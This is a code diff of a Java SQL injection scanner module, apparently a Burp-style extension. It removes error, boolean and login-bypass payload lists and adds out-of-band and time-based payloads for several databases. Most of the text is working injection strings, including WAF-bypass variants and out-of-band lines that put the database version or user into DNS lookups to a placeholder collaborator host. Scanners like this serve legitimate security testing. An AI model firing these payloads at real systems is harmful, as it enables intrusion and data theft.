@@ -142,447 +142,36 @@ public class SmartSqliDetector implements ScanModule {
         ));
     }
 
-    // Error-based payloads by DB type
-    private static final Map<String, String[]> ERROR_PAYLOADS_BY_DBMS;
-    static {
-        Map<String, String[]> ep = new LinkedHashMap<>();
-        ep.put("Generic", new String[]{
-                // Basic quote/syntax probes
-                "'", "''", "\"", "\\", "`",
-                "' -- -", "\" -- -",
-                "';", "\";",
-                // Classic OR/AND probes
-                "1 OR 1=1", "1' OR '1'='1", "1; --",
-                "' OR ''='", "1' OR 1=1-- -", "1\" OR 1=1-- -",
-                // Basic UNION probe
-                "' UNION SELECT NULL-- -",
-                // CAST error extraction (PostgreSQL/MSSQL)
-                "1' AND 1=CAST((SELECT version()) AS int)-- -",
-                "1' AND CAST((SELECT 1) AS int)=1-- -",
-                "1 AND 1=CAST('a' AS int)-- -",
-                // Space bypass via comment, newline, plus, tab
-                "1'/**/OR/**/1=1-- -",
-                "1'%0aOR%0a1=1-- -",
-                "1'+OR+1=1-- -",
-                "1'%09OR%091=1-- -",
-                "1'%0bOR%0b1=1-- -",
-                "1'%0cOR%0c1=1-- -",
-                "1'%a0OR%a01=1-- -",
-                // Stacked query probes
-                "1';SELECT+1-- -",
-                "1\";SELECT+1-- -",
-                "1;SELECT 1-- -",
-                // Parenthetical grouping
-                "1')OR('1'='1",
-                "1'))OR(('1'='1",
-                "1') OR 1=1-- -",
-                "1')) OR 1=1-- -",
-                "1') AND ('1'='1",
-                "1%') OR 1=1-- -",
-                // Backslash escape variants
-                "\\'", "\\\\'",
-                // Null byte
-                "%00'",
-                // Wildcard LIKE probe
-                "' LIKE '",
-                "' NOT LIKE '",
-                // Math/arithmetic error probes
-                "1/0", "' OR 1/0-- -",
-                "1' AND 1/0-- -",
-                // HAVING/GROUP BY error extraction
-                "' HAVING 1=1-- -",
-                "' GROUP BY 1 HAVING 1=1-- -",
-                // Scientific notation edge case
-                "1e0' OR '1'='1",
-                "1e0\" OR \"1\"=\"1",
-        });
-        ep.put("MySQL", new String[]{
-                // extractvalue/updatexml error extraction
-                "' AND extractvalue(1,concat(0x7e,version()))-- -",
-                "' AND updatexml(1,concat(0x7e,version()),1)-- -",
-                "1' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
-                "1' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
-                // EXP overflow (MySQL 5.5.5+)
-                "' AND EXP(~(SELECT * FROM (SELECT version())a))-- -",
-                // GTID_SUBSET error
-                "' AND GTID_SUBSET(version(),0)-- -",
-                // JSON error extraction (5.7+)
-                "' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))-- -",
-                // geometry functions error
-                "' AND ST_LatFromGeoHash(version())-- -",
-                "' AND ST_LongFromGeoHash(version())-- -",
-                // ORDER BY SLEEP
-                "1' ORDER BY 1,SLEEP(0)-- -",
-                // INTO error
-                "' INTO @a-- -",
-                "' INTO OUTFILE '/dev/null'-- -",
-                // Double-query error injection
-                "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
-                // Inline comment injection
-                "1'/*!50000OR*/1=1-- -",
-                "1'/*!OR*/1=1-- -",
-        });
-        ep.put("MSSQL", new String[]{
-                // CONVERT error extraction — single-quote prefix
-                "' AND 1=CONVERT(int,(SELECT @@version))-- -",
-                "' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
-                "' AND 1=CONVERT(int,(SELECT user))-- -",
-                // CONVERT error extraction — 1' prefix
-                "1' AND 1=CONVERT(int,(SELECT @@version))-- -",
-                "1' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
-                "1' AND 1=CONVERT(int,(SELECT user))-- -",
-                "1 AND 1=CONVERT(int,(SELECT @@version))-- -",
-                // MSSQL specific
-                "' AND 1=@@SERVERNAME-- -",
-                "1' AND 1=@@SERVERNAME-- -",
-                "'; EXEC xp_msver-- -",
-                "1'; EXEC xp_msver-- -",
-        });
-        ep.put("PostgreSQL", new String[]{
-                // PostgreSQL error extraction
-                "' AND 1=1/(SELECT 0 FROM pg_sleep(0))-- -",
-                "' AND 1::int=2::text-- -",
-                "1' AND 1::int=2::text-- -",
-        });
-        ep.put("Oracle", new String[]{
-                // Oracle error extraction
-                "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
-                "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
-                "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
-        });
-        ep.put("SQLite", new String[]{
-                // SQLite error extraction
-                "' AND 1=LOAD_EXTENSION('a')-- -",
-        });
-        ERROR_PAYLOADS_BY_DBMS = Collections.unmodifiableMap(ep);
-    }
-
-    // Time-based payloads by DB
-    private static final Map<String, String[]> TIME_PAYLOADS;
-    static {
-        Map<String, String[]> tp = new LinkedHashMap<>();
-        tp.put("MySQL", new String[]{
-                // Basic SLEEP
-                "' OR SLEEP(18)-- -", "1' AND SLEEP(18)-- -", "\" OR SLEEP(18)-- -",
-                "1 AND SLEEP(18)-- -", "' OR SLEEP(18)#",
-                // Comment-as-space bypass
-                "'/**/OR/**/SLEEP(18)#",
-                "1'/**/AND/**/SLEEP(18)-- -",
-                // Conditional SLEEP with IF
-                "' AND IF(1=1,SLEEP(18),0)-- -",
-                "' AND IF(1=1,SLEEP(18),0)#",
-                "1' AND IF(1=1,SLEEP(18),0)-- -",
-                "\" AND IF(1=1,SLEEP(18),0)-- -",
-                "1 AND IF(1=1,SLEEP(18),0)-- -",
-                // Conditional SLEEP with CASE
-                "' AND (CASE WHEN 1=1 THEN SLEEP(18) ELSE 0 END)-- -",
-                "1' AND (CASE WHEN 1=1 THEN SLEEP(18) ELSE 0 END)-- -",
-                // Subquery wrapper (WAF bypass)
-                "' AND (SELECT SLEEP(18))-- -",
-                "1' AND (SELECT SLEEP(18))-- -",
-                "' AND (SELECT * FROM (SELECT SLEEP(18))a)-- -",
-                "1' AND (SELECT * FROM (SELECT(SLEEP(18)))a)-- -",
-                // SLEEP in UNION
-                "' UNION SELECT SLEEP(18)-- -",
-                "' UNION SELECT SLEEP(18),NULL-- -",
-                // Parenthetical grouping
-                "') OR SLEEP(18)-- -",
-                "')) OR SLEEP(18)-- -",
-                "') AND SLEEP(18)-- -",
-                // Inline comment bypass
-                "'/*!50000AND*/SLEEP(18)-- -",
-                "'/*!SLEEP(18)*/-- -",
-                // Newline bypass
-                "'%0aOR%0aSLEEP(18)-- -",
-                // ELT/MAKE_SET based (alternative delay)
-                "' AND ELT(1=1,SLEEP(18))-- -",
-                // Stacked query with SLEEP
-                "'; SELECT SLEEP(18)-- -",
-                "1'; SELECT SLEEP(18)-- -",
-                // BENCHMARK fallback — tried last, after all SLEEP variants fail.
-                // SLEEP is sometimes blacklisted by WAF rules; BENCHMARK achieves the same
-                // delay via CPU computation and is less commonly filtered.
-                "' AND BENCHMARK(10000000,SHA1('test'))-- -",
-                "1' AND BENCHMARK(10000000,SHA1('test'))-- -",
-                "' AND BENCHMARK(5000000,MD5('test'))-- -",
-                "' AND IF(1=1,BENCHMARK(10000000,SHA1('test')),0)-- -",
-                "1' AND IF(1=1,BENCHMARK(10000000,SHA1('test')),0)-- -",
-        });
-        tp.put("PostgreSQL", new String[]{
-                // Basic PG_SLEEP
-                "'; SELECT PG_SLEEP(18)-- -", "1'; SELECT PG_SLEEP(18)-- -",
-                "' || (SELECT PG_SLEEP(18))-- -",
-                // Comment-as-space bypass
-                "';/**/SELECT/**/PG_SLEEP(18)-- -",
-                // Conditional PG_SLEEP with CASE
-                "' AND (CASE WHEN 1=1 THEN (SELECT PG_SLEEP(18)) END) IS NOT NULL-- -",
-                "1' AND (CASE WHEN 1=1 THEN (SELECT PG_SLEEP(18)) END) IS NOT NULL-- -",
-                "' AND CASE WHEN 1=1 THEN CAST((SELECT PG_SLEEP(18)) AS text) ELSE '0' END='0'-- -",
-                // Subquery wrapper
-                "' AND (SELECT PG_SLEEP(18)) IS NOT NULL-- -",
-                "1' AND (SELECT PG_SLEEP(18)) IS NOT NULL-- -",
-                "' AND 1=(SELECT 1 FROM PG_SLEEP(18))-- -",
-                // Stacked query variants
-                "\"; SELECT PG_SLEEP(18)-- -",
-                "1; SELECT PG_SLEEP(18)-- -",
-                // generate_series based delay
-                "'; SELECT COUNT(*) FROM generate_series(1,10000000)-- -",
-                // Parenthetical grouping
-                "'); SELECT PG_SLEEP(18)-- -",
-                "')); SELECT PG_SLEEP(18)-- -",
-                // PG_SLEEP in WHERE
-                "' AND PG_SLEEP(18)::text='1'-- -",
-        });
-        tp.put("MSSQL", new String[]{
-                // Basic WAITFOR DELAY
-                "'; WAITFOR DELAY '0:0:18'-- -", "1'; WAITFOR DELAY '0:0:18'-- -",
-                "' WAITFOR DELAY '0:0:18'-- -",
-                // Comment-as-space bypass
-                "';/**/WAITFOR/**/DELAY/**/'0:0:18'-- -",
-                // Double quote variant
-                "\"; WAITFOR DELAY '0:0:18'-- -",
-                // No-quote (integer injection)
-                "1; WAITFOR DELAY '0:0:18'-- -",
-                // Conditional WAITFOR with IF
-                "'; IF(1=1) WAITFOR DELAY '0:0:18'-- -",
-                "1'; IF(1=1) WAITFOR DELAY '0:0:18'-- -",
-                "'; IF 1=1 WAITFOR DELAY '0:0:18'-- -",
-                // Conditional with CASE
-                "'; DECLARE @d VARCHAR(10);SET @d=CASE WHEN 1=1 THEN '0:0:18' ELSE '0:0:0' END;WAITFOR DELAY @d-- -",
-                // Stacked query variants
-                "1; WAITFOR DELAY '0:0:18'-- -",
-                // Parenthetical grouping
-                "'); WAITFOR DELAY '0:0:18'-- -",
-                "')); WAITFOR DELAY '0:0:18'-- -",
-                // WAITFOR TIME (wait until a time, less common but works)
-                "'; WAITFOR DELAY '00:00:18'-- -",
-                // Heavy query alternative (no WAITFOR needed)
-                "' AND (SELECT COUNT(*) FROM sysusers AS a CROSS JOIN sysusers AS b CROSS JOIN sysusers AS c)>0-- -",
-        });
-        tp.put("SQLite", new String[]{
-                // RANDOMBLOB heavy computation
-                "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
-                "1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
-                "\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
-                // Alternative heavy computation
-                "' AND 1=LIKE('A',UPPER(HEX(RANDOMBLOB(1000000000/2))))-- -",
-                // ZEROBLOB variant
-                "' AND 1=LIKE('A',HEX(ZEROBLOB(500000000)))-- -",
-        });
-        tp.put("Oracle", new String[]{
-                // DBMS_PIPE.RECEIVE_MESSAGE
-                "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -",
-                "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -",
-                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',18)-- -",
-                // Conditional with CASE
-                "' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',18) ELSE 0 END=1-- -",
-                // DBMS_LOCK.SLEEP (requires DBA privilege)
-                "'; BEGIN DBMS_LOCK.SLEEP(18); END;-- -",
-                "1'; BEGIN DBMS_LOCK.SLEEP(18); END;-- -",
-                // UTL_INADDR heavy DNS lookup
-                "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('10.0.0.1')-- -",
-                // Heavy query (cross join)
-                "' AND 1=(SELECT COUNT(*) FROM all_objects a, all_objects b WHERE ROWNUM<=10000000)-- -",
-                // DBMS_SESSION.SLEEP (12c+)
-                "'; BEGIN DBMS_SESSION.SLEEP(18); END;-- -",
-                // httpuritype timeout
-                "' AND 1=HTTPURITYPE('http://10.255.255.1/').GETCLOB()-- -",
-        });
-        TIME_PAYLOADS = Collections.unmodifiableMap(tp);
-    }
-
-    // Boolean-based payload pairs: [true, false]
-    private static final String[][] BOOLEAN_PAIRS = {
-            // Basic single-quote AND
-            {"1' AND '1'='1", "1' AND '1'='2"},
-            // Integer AND
-            {"1 AND 1=1", "1 AND 1=2"},
-            // Single-quote OR
-            {"' OR '1'='1' -- -", "' OR '1'='2' -- -"},
-            // Integer OR
-            {"1 OR 1=1", "1 OR 1=2"},
-            // Double-quote AND
-            {"1\" AND \"1\"=\"1", "1\" AND \"1\"=\"2"},
-            // Comment-as-space bypass
-            {"1'/**/AND/**/'1'='1", "1'/**/AND/**/'1'='2"},
-            {"1'/**/OR/**/'1'='1", "1'/**/OR/**/'1'='2"},
-            // Parenthetical grouping
-            {"1')AND('1'='1", "1')AND('1'='2"},
-            {"1'))AND(('1'='1", "1'))AND(('1'='2"},
-            {"1') AND 1=1-- -", "1') AND 1=2-- -"},
-            // Bare AND with comment terminator
-            {"1 AND 1=1-- -", "1 AND 1=2-- -"},
-            // LIKE-based
-            {"1' AND 'a' LIKE 'a", "1' AND 'a' LIKE 'b"},
-            {"' OR 'a' LIKE 'a' -- -", "' OR 'a' LIKE 'b' -- -"},
-            // BETWEEN-based
-            {"1' AND 1 BETWEEN 1 AND 1-- -", "1' AND 1 BETWEEN 2 AND 3-- -"},
-            // Regex-based (MySQL)
-            {"1' AND 'a' REGEXP 'a'-- -", "1' AND 'a' REGEXP 'b'-- -"},
-            // SIMILAR TO (PostgreSQL)
-            {"1' AND 'a' SIMILAR TO 'a'-- -", "1' AND 'a' SIMILAR TO 'b'-- -"},
-            // Subtraction-based (no quotes needed)
-            {"1 AND 1-1=0", "1 AND 1-1=1"},
-            {"1' AND 1-1=0-- -", "1' AND 1-1=1-- -"},
-            // MOD-based
-            {"1' AND MOD(1,1)=0-- -", "1' AND MOD(1,1)=1-- -"},
-            // Conditional string comparison
-            {"' AND 'a'='a' -- -", "' AND 'a'='b' -- -"},
-            // NULL comparison
-            {"1' AND NULL IS NULL-- -", "1' AND NULL IS NOT NULL-- -"},
-            // Subquery boolean
-            {"1' AND (SELECT 1)=1-- -", "1' AND (SELECT 1)=2-- -"},
-            {"' OR (SELECT 1)=1-- -", "' OR (SELECT 1)=2-- -"},
-            // SUBSTRING/SUBSTR probes (confirm data extraction)
-            {"1' AND SUBSTRING('a',1,1)='a'-- -", "1' AND SUBSTRING('a',1,1)='b'-- -"},
-            {"1' AND SUBSTR('a',1,1)='a'-- -", "1' AND SUBSTR('a',1,1)='b'-- -"},
-            // ASCII comparison
-            {"1' AND ASCII('a')=97-- -", "1' AND ASCII('a')=98-- -"},
-            // LENGTH/CHAR_LENGTH probe
-            {"1' AND LENGTH('a')=1-- -", "1' AND LENGTH('a')=2-- -"},
-            // ORD probe (MySQL)
-            {"1' AND ORD('a')=97-- -", "1' AND ORD('a')=98-- -"},
-            // MID probe (MySQL)
-            {"1' AND MID('abc',1,1)='a'-- -", "1' AND MID('abc',1,1)='b'-- -"},
-            // LEFT probe
-            {"1' AND LEFT('abc',1)='a'-- -", "1' AND LEFT('abc',1)='b'-- -"},
-            // Inline comment bypass
-            {"1'/*!AND*/'1'='1", "1'/*!AND*/'1'='2"},
-            // Newline bypass
-            {"1'%0aAND%0a'1'='1", "1'%0aAND%0a'1'='2"},
-            // information_schema existence probe
-            {"1' AND (SELECT COUNT(*) FROM information_schema.tables)>=0-- -",
-             "1' AND (SELECT COUNT(*) FROM information_schema.tables)<0-- -"},
-            // Percent wildcard (LIKE injection in search)
-            {"1%' AND '1'='1' -- -", "1%' AND '1'='2' -- -"},
-    };
-
-    // Auth bypass payloads — ORIGINAL_VALUE is replaced with the actual param value
-    private static final String[] AUTH_BYPASS_PAYLOADS = {
-            // Append comment to original value (like PortSwigger lab: administrator'--)
-            "ORIGINAL_VALUE'--",
-            "ORIGINAL_VALUE'-- -",
-            "ORIGINAL_VALUE'#",
-            "ORIGINAL_VALUE\"--",
-            "ORIGINAL_VALUE\"-- -",
-            "ORIGINAL_VALUE\"#",
-            // Append comment with different terminators
-            "ORIGINAL_VALUE')--",
-            "ORIGINAL_VALUE')-- -",
-            "ORIGINAL_VALUE'))--",
-            // Standalone bypass payloads — single quote
-            "' OR 1=1-- -",
-            "' OR 1=1#",
-            "' OR 1=1/*",
-            "' OR '1'='1'-- -",
-            "' OR '1'='1'#",
-            "' OR ''='",
-            "' OR 'x'='x'-- -",
-            "' OR 'a'='a",
-            // Standalone bypass payloads — double quote
-            "\" OR 1=1-- -",
-            "\" OR 1=1#",
-            "\" OR \"1\"=\"1\"-- -",
-            // Parenthetical grouping bypasses
-            "') OR ('1'='1'-- -",
-            "') OR 1=1-- -",
-            "') OR ('1'='1",
-            "')) OR 1=1-- -",
-            "')) OR (('1'='1",
-            // Admin-specific
-            "admin'--",
-            "admin'-- -",
-            "admin'#",
-            "admin\"--",
-            "admin')--",
-            // LIMIT/TOP variants
-            "' OR 1=1 LIMIT 1-- -",
-            "' OR 1=1 LIMIT 1#",
-            "' OR 1=1 LIMIT 1,1-- -",
-            "'; SELECT TOP 1 * FROM users-- -",
-            // UNION-based auth bypass
-            "' UNION SELECT 1-- -",
-            "' UNION SELECT 1,1-- -",
-            "' UNION SELECT 1,1,1-- -",
-            "' UNION SELECT NULL,NULL,NULL-- -",
-            "' UNION SELECT 'admin','password'-- -",
-            // Integer-based auth bypass (no quotes)
-            "1 OR 1=1-- -",
-            "1 OR 1=1#",
-            // Comment-as-space bypass
-            "'/**/OR/**/1=1-- -",
-            "'/**/OR/**/'1'='1'-- -",
-            // Newline bypass
-            "'%0aOR%0a1=1-- -",
-            // True condition bypasses
-            "' OR 2>1-- -",
-            "' OR 'a' LIKE 'a'-- -",
-            "' OR 1 BETWEEN 0 AND 2-- -",
-            "' OR NOT 0-- -",
-            "' OR NOT 1=2-- -",
-            // MySQL specific
-            "' OR 1=1-- -",
-            "' || 1=1-- -",
-            "' && 1=1-- -",
-            // PostgreSQL specific
-            "' OR TRUE-- -",
-            "' OR 1::bool-- -",
-            // MSSQL specific
-            "' OR 1=1;-- -",
-            // Null byte before comment (edge case)
-            "ORIGINAL_VALUE'%00-- -",
-            // Backslash escape (MySQL NO_BACKSLASH_ESCAPES)
-            "\\'OR 1=1-- -",
-    };
-
-    // Parameter names that suggest a login/auth form
-    private static final Set<String> LOGIN_PARAM_NAMES = Set.of(
-            "username", "user", "uname", "login", "email", "userid", "user_id",
-            "user_name", "loginid", "login_id", "account", "usr", "name",
-            "uid", "signin", "sign_in", "log", "logname"
-    );
-
-    // Keywords in response body that indicate successful login
-    private static final String[] SUCCESS_KEYWORDS = {
-            "welcome", "dashboard", "logout", "log out", "sign out", "signout",
-            "my account", "my profile", "profile", "settings", "admin panel",
-            "successfully", "logged in", "authenticated"
-    };
-
-    // Keywords in response body that indicate failed login
-    private static final String[] FAILURE_KEYWORDS = {
-            "invalid", "incorrect", "failed", "wrong", "error", "denied",
-            "unauthorized", "bad credentials", "login failed", "try again",
-            "invalid username", "invalid password", "authentication failed"
-    };
-
     // OOB payloads by DB type (use COLLAB_PLACEHOLDER for Collaborator domain)
     private static final Map<String, String[]> OOB_PAYLOADS;
     static {
         Map<String, String[]> oob = new LinkedHashMap<>();
         oob.put("MySQL", new String[]{
-                // LOAD_FILE with UNC path (DNS exfiltration) — string context
+                // LOAD_FILE with UNC path — single-quote string context
                 "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
                 "' AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
+                // Double-quote context
+                "\" UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
+                "\" AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
+                // Data exfil: version + user in subdomain
                 "1' UNION SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT version()),0x2e,COLLAB_PLACEHOLDER,0x5c5c61))-- -",
+                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',REPLACE(user(),CHAR(64),CHAR(46)),'.',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
                 // INTO OUTFILE/DUMPFILE via UNC
                 "' UNION SELECT 'test' INTO OUTFILE '\\\\\\\\COLLAB_PLACEHOLDER\\\\a'-- -",
                 "' UNION SELECT 'test' INTO DUMPFILE '\\\\\\\\COLLAB_PLACEHOLDER\\\\a'-- -",
-                // XML functions
+                // LOAD_FILE via hex-encoded path (WAF bypass)
+                "' UNION SELECT LOAD_FILE(0x5c5c5c5cCOLLAB_PLACEHOLDER5c61)-- -",
+                "' AND LOAD_FILE(CONCAT(CHAR(92,92),(SELECT version()),CHAR(46),COLLAB_PLACEHOLDER,CHAR(92,97)))-- -",
+                // XML error functions wrapping LOAD_FILE
                 "' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a')))))-- -",
                 "' AND updatexml(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a')))),1)-- -",
-                // LOAD_FILE via CHAR() encoding (WAF bypass)
-                "' UNION SELECT LOAD_FILE(CHAR(92,92)+COLLAB_PLACEHOLDER+CHAR(92,97))-- -",
-                "' AND LOAD_FILE(CONCAT(CHAR(92,92),(SELECT version()),CHAR(46),COLLAB_PLACEHOLDER,CHAR(92,97)))-- -",
-                // Data exfil: user() in subdomain
-                "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',REPLACE(user(),CHAR(64),CHAR(46)),'.',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
-                // SELECT INTO via CHAR encoding
-                "' UNION SELECT 'test' INTO OUTFILE CONCAT(CHAR(92,92),COLLAB_PLACEHOLDER,CHAR(92,97))-- -",
-                // Subquery-wrapped — numeric context (WHERE id=1 AND (...) IS NOT NULL)
+                // LOAD_FILE via SET @var — avoids string concatenation detection
+                "'; SET @q=CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'); SELECT LOAD_FILE(@q)-- -",
+                // Subquery-wrapped — numeric context
                 "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
                 "1 OR (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
                 "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT user()),'.', COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
-                // Subquery-wrapped — no quotes (integer injection)
+                // Integer injection — no quotes
                 "(SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,COLLAB_PLACEHOLDER,0x5c5c61)))",
         });
         oob.put("MSSQL", new String[]{
@@ -737,6 +326,69 @@ public class SmartSqliDetector implements ScanModule {
         OOB_PAYLOADS = Collections.unmodifiableMap(oob);
     }
 
+    // Time-based payloads — ~10 per DBMS, 5-second delay
+    private static final Map<String, String[]> TIME_PAYLOADS;
+    static {
+        Map<String, String[]> tp = new LinkedHashMap<>();
+        tp.put("MySQL", new String[]{
+                "' AND SLEEP(5)-- -",
+                "1' AND SLEEP(5)-- -",
+                "\" AND SLEEP(5)-- -",
+                "1 AND SLEEP(5)-- -",
+                "' AND IF(1=1,SLEEP(5),0)-- -",
+                "1' AND IF(1=1,SLEEP(5),0)-- -",
+                "' AND (SELECT SLEEP(5))-- -",
+                "1' AND (SELECT SLEEP(5))-- -",
+                "') AND SLEEP(5)-- -",
+                "' AND BENCHMARK(10000000,SHA1('x'))-- -",
+        });
+        tp.put("PostgreSQL", new String[]{
+                "'; SELECT PG_SLEEP(5)-- -",
+                "1'; SELECT PG_SLEEP(5)-- -",
+                "' AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
+                "1' AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
+                "'||(SELECT PG_SLEEP(5))-- -",
+                "' AND CASE WHEN 1=1 THEN (SELECT PG_SLEEP(5)) END IS NOT NULL-- -",
+                "1 AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
+                "'); SELECT PG_SLEEP(5)-- -",
+                "\" AND (SELECT PG_SLEEP(5)) IS NOT NULL-- -",
+                "1; SELECT PG_SLEEP(5)-- -",
+        });
+        tp.put("MSSQL", new String[]{
+                "'; WAITFOR DELAY '0:0:5'-- -",
+                "1'; WAITFOR DELAY '0:0:5'-- -",
+                "\"; WAITFOR DELAY '0:0:5'-- -",
+                "1; WAITFOR DELAY '0:0:5'-- -",
+                "'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
+                "1'; IF(1=1) WAITFOR DELAY '0:0:5'-- -",
+                "'); WAITFOR DELAY '0:0:5'-- -",
+                "' WAITFOR DELAY '0:0:5'-- -",
+                "')); WAITFOR DELAY '0:0:5'-- -",
+                "'; IF 1=1 WAITFOR DELAY '0:0:5'-- -",
+        });
+        tp.put("Oracle", new String[]{
+                "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
+                "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
+                "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
+                "'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)||'",
+                "' AND CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END=1-- -",
+                "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
+                "1||(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)",
+                "'; BEGIN DBMS_LOCK.SLEEP(5); END;-- -",
+                "'; BEGIN DBMS_SESSION.SLEEP(5); END;-- -",
+                "(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM DUAL)",
+        });
+        tp.put("SQLite", new String[]{
+                "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
+                "1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
+                "\" AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- -",
+                "' AND 1=LIKE('A',UPPER(HEX(RANDOMBLOB(1000000000/2))))-- -",
+                "' AND 1=LIKE('A',HEX(ZEROBLOB(500000000)))-- -",
+        });
+        TIME_PAYLOADS = Collections.unmodifiableMap(tp);
+    }
+
+
     private static final String UNION_MARKER = "xXsSqLiXx";
 
     // Lightweight DBMS fingerprint probes — sent before the main payload battery
@@ -823,68 +475,38 @@ public class SmartSqliDetector implements ScanModule {
 
     private void testParameter(HttpRequestResponse original, InjectionPoint ip, String urlPath) {
         try {
-            // Phase 1: Baseline (3 measurements, use max to reduce false positives)
-            // Baseline must come first — fingerprint needs baselineBody for comparison
-            TimedResult baselineTimedResult = measureResponseTime(original, ip, ip.originalValue);
-            HttpRequestResponse baseline = baselineTimedResult.response;
+            // Phase 1: Baseline
+            HttpRequestResponse baseline = sendWithPayload(original, ip, ip.originalValue);
             if (baseline == null || baseline.response() == null) return;
-
-            long baselineTime = baselineTimedResult.elapsedMs;
-            TimedResult b2 = measureResponseTime(original, ip, ip.originalValue);
-            TimedResult b3 = measureResponseTime(original, ip, ip.originalValue);
-            baselineTime = Math.max(baselineTime, Math.max(
-                    b2.response != null ? b2.elapsedMs : 0,
-                    b3.response != null ? b3.elapsedMs : 0));
 
             String baselineBody = baseline.response().bodyToString();
             if (baselineBody == null) baselineBody = "";
             int baselineLength = baselineBody.length();
             int baselineStatus = baseline.response().statusCode();
 
-            // Phase 2: DBMS Fingerprint — identify backend DB to skip irrelevant payloads
+            // Phase 2: DBMS Fingerprint — identify backend DB to filter OOB/UNION payloads
             String detectedDbms = null;
             if (config.getBool("sqli.fingerprint.enabled", true)) {
                 detectedDbms = fingerprintDbms(original, ip, urlPath, baselineBody);
             }
 
-            // Phase 3: OOB via Collaborator (fire-and-forget: send payloads now, Collaborator
-            // polls for interactions in the background. If confirmed, oobConfirmedParams is set
-            // and remaining phases skip.)
+            // Phase 3: OOB via Collaborator (fire-and-forget)
             if (config.getBool("sqli.oob.enabled", true) && collaboratorManager != null && collaboratorManager.isAvailable()) {
                 testOob(original, ip, detectedDbms);
             }
 
-            // Phase 4: Auth bypass (if enabled and looks like a login param)
-            if (oobConfirmedParams.contains(ip.name)) return;
-            if (config.getBool("sqli.authBypass.enabled", true)) {
-                testAuthBypass(original, ip, baselineStatus, baselineLength, baselineBody);
-            }
-
-            // Phase 5: Error-based (if enabled)
-            if (oobConfirmedParams.contains(ip.name)) return;
-            if (config.getBool("sqli.error.enabled", true)) {
-                testErrorBased(original, ip, baselineBody, detectedDbms);
-            }
-
-            // Phase 6: Union-based (if enabled)
+            // Phase 4: Union-based
             if (oobConfirmedParams.contains(ip.name)) return;
             if (config.getBool("sqli.union.enabled", true)) {
                 testUnionBased(original, ip, baselineLength, baselineStatus, baselineBody);
             }
 
-            // Phase 7: Boolean-based blind (if enabled)
-            if (oobConfirmedParams.contains(ip.name)) return;
-            if (config.getBool("sqli.boolean.enabled", true)) {
-                testBooleanBased(original, ip, baselineLength, baselineStatus, baselineBody);
-            }
-
-            // Phase 8: Time-based blind (LAST — serialized via TimingLock)
-            // Gated by global TimingLock.isEnabled() checkbox AND per-module config
+            // Phase 5: Time-based blind (serialized via TimingLock to avoid false positives)
             if (oobConfirmedParams.contains(ip.name)) return;
             if (TimingLock.isEnabled() && config.getBool("sqli.time.enabled", false)) {
                 try {
